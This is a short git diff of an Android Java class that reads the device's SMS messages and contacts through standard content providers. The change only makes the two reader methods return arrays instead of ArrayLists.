@@ -29,7 +29,7 @@ public class RecuperateurInfo {
 
     private static int VALEUR_MESSAGE_ENVOYER = 2;
 
-    static ArrayList<EnveloppeMessage> lireTousMessage(Service service) {
+    static EnveloppeMessage[] lireTousMessage(Service service) {
         ArrayList<EnveloppeMessage> enveloppeMessages = new ArrayList<>();
         Uri uri = Uri.parse("content://sms/");
         Cursor cur = service.getContentResolver().query(uri, null, null, null, null);
@@ -46,10 +46,10 @@ public class RecuperateurInfo {
             }
         }
         cur.close();
-        return enveloppeMessages;
+        return enveloppeMessages.toArray(new EnveloppeMessage[enveloppeMessages.size()]);
     }
 
-    static ArrayList<EnveloppeContact> lireTousContact(Service service) {
+    static EnveloppeContact[] lireTousContact(Service service) {
         ArrayList<EnveloppeContact> enveloppeContacts = new ArrayList<>();
 
         Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
@@ -76,6 +76,6 @@ public class RecuperateurInfo {
             enveloppeContacts.add(new EnveloppeContact(numero, nom, image));
         } while (curContact.moveToNext());
 
-        return enveloppeContacts;
+        return enveloppeContacts.toArray(new EnveloppeContact[enveloppeContacts.size()]);
     }
 }
